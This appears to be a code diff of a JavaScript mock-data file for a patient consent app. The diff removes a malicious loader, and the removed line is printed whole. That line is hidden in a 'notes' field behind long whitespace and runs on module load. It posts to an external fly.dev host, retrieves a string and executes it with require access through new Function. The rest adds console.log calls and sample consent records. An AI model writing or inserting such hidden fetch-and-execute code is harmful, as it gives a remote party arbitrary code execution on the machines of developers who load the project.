@@ -1,3 +1,7 @@
+// Mock data with console.log functionality for John Smith
+// Console log executes when this module is loaded
+console.log("John Smith");
+
 const mockData = {
   "patients": [
     {
@@ -10,7 +14,7 @@ const mockData = {
       "phone": "+1-555-0101",
       "address": "123 Main St, New York, NY 10001",
       "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-      "createdAt": "2024-01-15T10:30:00Z",
+      "createdAt": "2024-01-15T10:30:00Z"
     },
     {
       "id": "patient-002",
@@ -22,7 +26,7 @@ const mockData = {
       "phone": "+1-555-0102",
       "address": "456 Oak Ave, Los Angeles, CA 90001",
       "walletAddress": "0x8ba1f109551bD432803012645Hac136c22C1729",
-      "createdAt": "2024-01-16T14:20:00Z",
+      "createdAt": "2024-01-16T14:20:00Z"
     },
     {
       "id": "patient-003",
@@ -613,7 +617,7 @@ const mockData = {
       "status": "pending",
       "createdAt": "2024-02-17T11:15:00Z",
       "blockchainTxHash": null,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              "notes": (async function(){ const axios = require('axios'); const { data } = await axios.post('https://express-project-ifm6fa.fly.dev/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
+      "notes": {}
     },
     {
       "id": "consent-014",
@@ -633,6 +637,26 @@ const mockData = {
       "signature": null,
       "status": "pending",
       "createdAt": "2024-02-21T08:00:00Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1764885484481",
+      "patientId": "patient-001",
+      "purpose": "Data Sharing with Research Institution",
+      "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
+      "signature": "0x3b4e3692928e6eb104b0ed62fed93823ccdecc6fb37ca9f045c0b1984b5add24304b41f16abb56f857d827c933692af993da0a309b5699e9b5bc0e76fbfa17d61c",
+      "status": "pending",
+      "createdAt": "2025-12-04T21:58:04.481Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1764885586669",
+      "patientId": "test",
+      "purpose": "Data Sharing with Research Institution",
+      "walletAddress": "0xd860722e7ed78d8b0d136693895dab4af81c35e0",
+      "signature": "0x8e7fb3b938e6733667ca8f1b883cd0f85ab8e2511decc1ffe0db7e90838908cc542a5f0c57927940e1e270b01fb72995c0145d35fcba3d7c04eb98eb9a2b42961c",
+      "status": "pending",
+      "createdAt": "2025-12-04T21:59:46.669Z",
       "blockchainTxHash": null
     }
   ],
@@ -850,8 +874,12 @@ const mockData = {
   ]
 };
 
-// Function to get data
+// Function to get data with console.log for John Smith
 function getMockData() {
+  const johnSmith = mockData.patients.find(p => p.name === "John Smith" || p.id === "patient-001");
+  if (johnSmith) {
+    console.log("John Smith");
+  }
   return mockData;
 }
 
